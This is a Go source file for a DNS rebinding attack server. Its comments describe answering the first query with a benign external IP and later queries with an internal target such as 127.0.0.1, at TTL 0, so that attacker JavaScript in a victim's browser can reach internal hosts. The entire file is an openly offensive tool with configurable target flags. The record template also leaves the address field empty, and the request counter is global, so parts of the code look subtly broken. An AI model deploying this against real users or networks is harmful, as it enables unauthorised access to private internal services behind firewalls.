package main

import (
	"flag"
	"fmt"
	"log"
	"net"
	"os"
	"os/signal"
	"sync"
	"syscall"

	"github.com/miekg/dns"
)

var (
	requestCount int
	mu           sync.Mutex
)

// DNS Rebinding Attack:
// First request resolves to a benign external IP (to pass security/CORS checks
// from the victim's browser).
// Second request resolves to the target internal IP (e.g. 127.0.0.1 or 192.168.1.1).
// Since the TTL is set to 0, the browser drops the cache and re-queries
// right as the malicious JavaScript makes the payload request, pivoting
// the attacker into the internal network.
func handleRebind(w dns.ResponseWriter, r *dns.Msg, domain, safeIP, targetIP string) {
	m := new(dns.Msg)
	m.SetReply(r)

	mu.Lock()
	requestCount++
	count := requestCount
	mu.Unlock()

	for _, q := range r.Question {
		log.Printf("Query %d for %s", count, q.Name)

		rr, err := dns.NewRR(fmt.Sprintf("%s 0 IN A ", q.Name))
		if err != nil {
			log.Printf("Error creating RR: %v", err)
			continue
		}

		// The classic rebind pivot logic
		if count == 1 {
			rr.(*dns.A).A = net.ParseIP(safeIP)
			log.Printf("  -> Responding with SAFE EXTERNAL IP: %s (TTL 0)", safeIP)
		} else {
			rr.(*dns.A).A = net.ParseIP(targetIP)
			log.Printf("  -> Responding with TARGET INTERNAL IP: %s (TTL 0)", targetIP)
		}

		m.Answer = append(m.Answer, rr)
	}

	w.WriteMsg(m)
}

func main() {
	domain := flag.String("domain", "rebind.example.com.", "Domain to rebind (MUST end in dot)")
	port := flag.Int("port", 5353, "DNS server port (use 53 for production, requires root)")
	safeIP := flag.String("safe", "198.51.100.1", "Initial safe IP address (external)")
	targetIP := flag.String("target", "127.0.0.1", "Target internal IP address to pivot to")
	flag.Parse()

	dns.HandleFunc(*domain, func(w dns.ResponseWriter, r *dns.Msg) {
		handleRebind(w, r, *domain, *safeIP, *targetIP)
	})

	server := &dns.Server{Addr: fmt.Sprintf(":%d", *port), Net: "udp"}
	log.Printf("Starting DNS Rebinding server on port %d", *port)
	log.Printf("Domain: %s | Safe IP: %s | Target IP: %s", *domain, *safeIP, *targetIP)

	sig := make(chan os.Signal, 1)
	signal.Notify(sig, os.Interrupt, syscall.SIGTERM)

	go func() {
		if err := server.ListenAndServe(); err != nil {
			log.Printf("Server error: %v", err)
		}
	}()

	<-sig

	log.Println("Shutting down...")
	server.Shutdown()
}
